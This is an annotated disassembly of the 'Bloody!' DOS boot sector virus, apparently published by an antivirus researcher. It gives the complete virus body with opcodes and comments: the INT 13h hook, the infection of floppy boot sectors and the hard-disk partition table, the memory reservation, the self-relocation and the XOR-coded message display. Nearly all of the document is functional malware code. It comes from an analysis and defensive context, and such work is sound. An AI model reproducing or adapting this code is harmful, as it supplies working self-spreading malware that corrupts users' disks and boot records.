
; 	BLOODY! virus
;
;	Discovered an commented by  Ferenc Leitold
; 			      Hungarian VirusBuster Team
;                              Address: 1399 Budapest
;                                       P.O. box 701/349
;                                          HUNGARY


217D:0100  2EFF2E177C     JMP    Far CS:[7C17]
217D:0105  E9B500         JMP    01BD		; Jump to main entry point

217D:0108  00        	  db	 0		; Counter
217D:0109  00        	  db	 0
217D:010A  00             db	 0		; Flag:
						;      00 : floppy
						;      80 : hard disk
217D:010B  00             db	 0

217D:010C  A100F0         MOV    AX,[F000]

217D:010F  0301809F       DW	 0103H,9F80H	; Entry point at TOP

217D:0113  007C0000	  DW	 7C00H,0000H	; Address of orig. boot

217D:0117  057C0000       DW	 7C05H,0000H

217D:011B  00000000	  DW	 0000H,0000H	; original INT13 vector

;************************ INT13 entry point *****************************

217D:011F  80FC02         CMP    AH,02        	; Check parameters
217D:0122  720D           JC     0131
217D:0124  80FC04         CMP    AH,04
217D:0127  7308           JNC    0131
217D:0129  80FA80         CMP    DL,80
217D:012C  7303           JNC    0131
217D:012E  E80500         CALL   0136           ; Call, if AH=2,3 & DL!=80
217D:0131  2EFF2E0B00     JMP    Far CS:[000B]	; Jump to original INT13

217D:0136  50             PUSH   AX		; Save registers
217D:0137  53             PUSH   BX
217D:0138  51             PUSH   CX
217D:0139  52             PUSH   DX
217D:013A  06             PUSH   ES
217D:013B  1E             PUSH   DS
217D:013C  56             PUSH   SI
217D:013D  57             PUSH   DI

217D:013E  0E             PUSH   CS		; Set DS,ES to CS
217D:013F  1F             POP    DS
217D:0140  0E             PUSH   CS
217D:0141  07             POP    ES

217D:0142  BE0200         MOV    SI,0002	; 2 probe

217D:0145  33C0           XOR    AX,AX		; Reset drive
217D:0147  9C             PUSHF
217D:0148  FF1E0B00       CALL   Far [000B]	; Call INT13
217D:014C  B80102         MOV    AX,0201	; Read boot sector of floppy
217D:014F  BB0002         MOV    BX,0200
217D:0152  B90100         MOV    CX,0001
217D:0155  32F6           XOR    DH,DH
217D:0157  9C             PUSHF
217D:0158  FF1E0B00       CALL   Far [000B]	; Call INT13
217D:015C  7305           JNC    0163
217D:015E  4E             DEC    SI		; If error next probe
217D:015F  75E4           JNZ    0145
217D:0161  EB2E           JMP    0191		; Jump, if 2 bad probes was

217D:0163  33F6           XOR    SI,SI  	; Check boot sector, if
217D:0165  BF0002         MOV    DI,0200	;  if infected yet
217D:0168  B90300         MOV    CX,0003
217D:016B  FC             CLD
217D:016C  F3A7           REP    CMPSW
217D:016E  7421           JZ     0191		; Jump, if already infected

217D:0170  B80103         MOV    AX,0301	; Write orig. boot sector
217D:0173  BB0002         MOV    BX,0200
217D:0176  B90300         MOV    CX,0003	; cyl: 0  sect: 3
217D:0179  B601           MOV    DH,01		; head: 1
217D:017B  9C             PUSHF
217D:017C  FF1E0B00       CALL   Far [000B]	; Call INT13
217D:0180  720F           JC     0191

217D:0182  B80103         MOV    AX,0301	; Write infected boot sector
217D:0185  33DB           XOR    BX,BX
217D:0187  B90100         MOV    CX,0001	; cyl:0 sect:1
217D:018A  32F6           XOR    DH,DH		; head: 0
217D:018C  9C             PUSHF
217D:018D  FF1E0B00       CALL   Far [000B]

217D:0191  5F             POP    DI		; Restore registers
217D:0192  5E             POP    SI
217D:0193  1F             POP    DS
217D:0194  07             POP    ES
217D:0195  5A             POP    DX
217D:0196  59             POP    CX
217D:0197  5B             POP    BX
217D:0198  58             POP    AX
217D:0199  C3             RET

217D:019A  1D1D1D1A3737         ; Coded text:
217D:01A0  37373737557B  	; "\r\r\r\n      Bloody! Jun. 4, 1989\r\r\r\n"
217D:01A6  7878736E3637
217D:01AC  5D6279393723
217D:01B2  3B37262E2F2E
217D:01B8  1D1D1D1A00

;************************** Main entry point *******************************

217D:01BD  33C0           XOR    AX,AX
217D:01BF  8ED8           MOV    DS,AX
217D:01C1  FA             CLI
217D:01C2  8ED0           MOV    SS,AX
217D:01C4  BC007C         MOV    SP,7C00
217D:01C7  FB             STI

217D:01C8  A14C00         MOV    AX,[004C]	; Save orig. INT13 vector
217D:01CB  A30B7C         MOV    [7C0B],AX
217D:01CE  A14E00         MOV    AX,[004E]
217D:01D1  A30D7C         MOV    [7C0D],AX

217D:01D4  A11304         MOV    AX,[0413]	; Decrease memory by 2KB
217D:01D7  48             DEC    AX
217D:01D8  48             DEC    AX
217D:01D9  A31304         MOV    [0413],AX

217D:01DC  B106           MOV    CL,06		; Calculate segment
217D:01DE  D3E0           SHL    AX,CL
217D:01E0  A3117C         MOV    [7C11],AX



217D:01E3  A34E00         MOV    [004E],AX	; Set new INT13 vector
217D:01E6  8EC0           MOV    ES,AX
217D:01E8  B81F00         MOV    AX,001F
217D:01EB  A34C00         MOV    [004C],AX

217D:01EE  C7060F7C0301   MOV    [7C0F],0103	; Set JMP argument points
						;  to TOP

217D:01F4  BE007C         MOV    SI,7C00	; Copy itself to TOP
217D:01F7  33FF           XOR    DI,DI
217D:01F9  B90001         MOV    CX,0100
217D:01FC  FC             CLD
217D:01FD  F3A5           REP    MOVSW
217D:01FF  FF2E0F7C       JMP    Far [7C0F]	; Jmp to TOP

TOP :0203  33C0           XOR    AX,AX		; Reset drive
TOP :0205  CD13           INT    13

TOP :0207  0E             PUSH   CS       	; Set registers to load
TOP :0208  1F             POP    DS		;  original sector
TOP :0209  33C0           XOR    AX,AX
TOP :020B  8EC0           MOV    ES,AX
TOP :020D  B80102         MOV    AX,0201
TOP :0210  BB007C         MOV    BX,7C00
TOP :0213  803E0A0000     CMP    [000A],00	; Check, if it is floppy ?
TOP :0218  7435           JZ     024F		; Jump, if floppy

						; if hard disk, load
						;  orig. part. table
TOP :021A  B90600         MOV    CX,0006	; cyl.: 0 sect.: 6
TOP :021D  BA8000         MOV    DX,0080	; head: 0
TOP :0220  CD13           INT    13
TOP :0222  0E             PUSH   CS
TOP :0223  07             POP    ES
TOP :0224  FE060800       INC    B/[0008]	; Increase counter
TOP :0228  803E080080     CMP    [0008],80
TOP :022D  721E           JC     024D		; If counter < 128 -> no text
TOP :022F  C60608007A     MOV    [0008],7A
TOP :0234  FC             CLD

TOP :0235  BE9A00         MOV    SI,009A	; Write coded text via BIOS
TOP :0238  AC             LODSB
TOP :0239  3C00           CMP    AL,00
TOP :023B  740C           JZ     0249
TOP :023D  32060300       XOR    AL,[0003]
TOP :0241  B40E           MOV    AH,0E
TOP :0243  B700           MOV    BH,00
TOP :0245  CD10           INT    10
TOP :0247  EBEF           JMP    0238

TOP :0249  B400           MOV    AH,00		; Wait for keystroke
TOP :024B  CD16           INT    16
TOP :024D  EB54           JMP    02A3

						; if floppy
TOP :024F  B90300         MOV    CX,0003	; read orig. boot sector
TOP :0252  BA0001         MOV    DX,0100	; cyl: 0 hd: 1 sect: 3
TOP :0255  CD13           INT    13

TOP :0257  0E             PUSH   CS
TOP :0258  07             POP    ES
TOP :0259  721D           JC     0278		; Jump, if error occured


TOP :025B  B80102         MOV    AX,0201	; Load part. table of
TOP :025E  BB0002         MOV    BX,0200	;  1st hard disk
TOP :0261  B90100         MOV    CX,0001
TOP :0264  BA8000         MOV    DX,0080
TOP :0267  CD13           INT    13
TOP :0269  720D           JC     0278		; Jump, if error occured

TOP :026B  BE0002         MOV    SI,0200	; Check 1st 3 word
TOP :026E  33FF           XOR    DI,DI
TOP :0270  B90300         MOV    CX,0003
TOP :0273  FC             CLD
TOP :0274  F3A7           REP    CMPSW
TOP :0276  750E           JNZ    0286

						; If infected yet
TOP :0278  C6060A0000     MOV    [000A],00 	; Set Flag to 0
TOP :027D  C606080000     MOV    [0008],00	; Reset counter
TOP :0282  FF2E1300       JMP    Far [0013]	; Jump to orig. boot

TOP :0286  B80103         MOV    AX,0301	; Write orig. part. table
TOP :0289  BB0002         MOV    BX,0200
TOP :028C  B90600         MOV    CX,0006        ; cyl: 0 sect: 6 hd: 0
TOP :028F  CD13           INT    13
TOP :0291  72E5           JC     0278

TOP :0293  BEBE03         MOV    SI,03BE	; Copy partition info
TOP :0296  BFBE01         MOV    DI,01BE	;  after virus body
TOP :0299  B92101         MOV    CX,0121
TOP :029C  F3A5           REP    MOVSW
TOP :029E  C6060A0001     MOV    [000A],01

TOP :02A3  B80103         MOV    AX,0301	; Write boot sector or
						;  partition table with
						;  increased counter
TOP :02A6  33DB           XOR    BX,BX
TOP :02A8  B90100         MOV    CX,0001
TOP :02AB  CD13           INT    13


TOP :02AD  BEBE04         MOV    SI,04BE	; Clear area of partition
TOP :02B0  BFBE01         MOV    DI,01BE	;  info
TOP :02B3  B92000         MOV    CX,0020
TOP :02B6  F3A5           REP    MOVSW
TOP :02B8  EBBE           JMP    0278		; Set parameters &
						;  jump to orig. boot
TOP :02BA  DE07           ESC    30,[BX]
TOP :02BC  DF07           ESC    38,[BX]
TOP :02BE  0000           ADD    [BX+SI],AL
TOP :02C0  0000           ADD    [BX+SI],AL
TOP :02C2  0000           ADD    [BX+SI],AL
TOP :02C4  0000           ADD    [BX+SI],AL
TOP :02C6  0000           ADD    [BX+SI],AL
TOP :02C8  0000           ADD    [BX+SI],AL
TOP :02CA  0000           ADD    [BX+SI],AL
TOP :02CC  0000           ADD    [BX+SI],AL
TOP :02CE  0000           ADD    [BX+SI],AL
TOP :02D0  0000           ADD    [BX+SI],AL
TOP :02D2  0000           ADD    [BX+SI],AL
TOP :02D4  0000           ADD    [BX+SI],AL
TOP :02D6  0000           ADD    [BX+SI],AL
TOP :02D8  0000           ADD    [BX+SI],AL
TOP :02DA  0000           ADD    [BX+SI],AL
TOP :02DC  0000           ADD    [BX+SI],AL
TOP :02DE  0000           ADD    [BX+SI],AL
TOP :02E0  0000           ADD    [BX+SI],AL
TOP :02E2  0000           ADD    [BX+SI],AL
TOP :02E4  0000           ADD    [BX+SI],AL
TOP :02E6  0000           ADD    [BX+SI],AL
TOP :02E8  0000           ADD    [BX+SI],AL
TOP :02EA  0000           ADD    [BX+SI],AL
TOP :02EC  0000           ADD    [BX+SI],AL
TOP :02EE  0000           ADD    [BX+SI],AL
TOP :02F0  0000           ADD    [BX+SI],AL
TOP :02F2  0000           ADD    [BX+SI],AL
TOP :02F4  0000           ADD    [BX+SI],AL
TOP :02F6  0000           ADD    [BX+SI],AL
TOP :02F8  0000           ADD    [BX+SI],AL
TOP :02FA  0000           ADD    [BX+SI],AL
TOP :02FC  0000           ADD    [BX+SI],AL
TOP :02FE  55             PUSH   BP
TOP :02FF  AA             STOSB
